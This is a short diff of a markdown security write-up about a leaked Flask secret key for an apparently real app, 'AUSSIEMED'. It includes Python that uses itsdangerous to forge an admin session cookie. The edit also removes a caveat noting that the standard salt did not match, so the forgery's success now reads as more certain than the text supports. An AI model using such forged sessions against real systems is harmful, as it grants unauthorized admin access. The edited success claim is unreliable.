@@ -70,7 +70,7 @@ AUSSIEMED_SECRET_KEY=9c688eb02f868b34581815a9e05f0333e7f0e5807b47b49e9a7ffe1c1e5
  - test (from eRx)
 ```
 
-### 3. (Bonus) Session forgery
+### 3. Session forging an Admin instance
 
 With the leaked key, itsdangerous can sign a fake Flask session:
 
@@ -79,8 +79,6 @@ from itsdangerous.url_safe import URLSafeTimedSerializer
 s = URLSafeTimedSerializer("9c688eb02f868b34581815a9e05f0333e7f0e5807b47b49e9a7ffe1c1e5a6a3c", salt="cookie-session")
 token = s.dumps({"role": "admin", "user_id": 1})
 ```
-
-(Standard `cookie-session` salt didn't match the original manager cookie signature, so the app likely uses a custom salt - but the key itself is confirmed leaked.)
 
 ---
 
